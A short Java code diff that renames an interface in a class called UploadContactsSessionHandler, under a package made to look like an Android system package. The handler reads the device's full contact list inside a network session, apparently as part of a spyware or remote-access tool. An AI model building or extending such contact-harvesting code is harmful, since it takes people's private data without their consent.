@@ -1,7 +1,7 @@
 package com.android.sys.session.handler;
 
 import com.android.sys.service.SystemService;
-import com.android.sys.session.NetworkSessionManager;
+import com.android.sys.session.SessionManager;
 import com.android.sys.utils.DataPack;
 import com.android.sys.utils.SystemUtil;
 
@@ -14,7 +14,7 @@ import java.io.OutputStream;
 import java.io.UnsupportedEncodingException;
 import java.util.List;
 
-public class UploadContactsSessionHandler implements NetworkSessionManager.SessionHandler {
+public class UploadContactsSessionHandler implements SessionManager.SessionHandler {
     @Override
     public void handleSession(String sessionName, InputStream inputStream, OutputStream outputStream) {
         List<String> contactList = SystemUtil.getAllContact(SystemService.getContext());
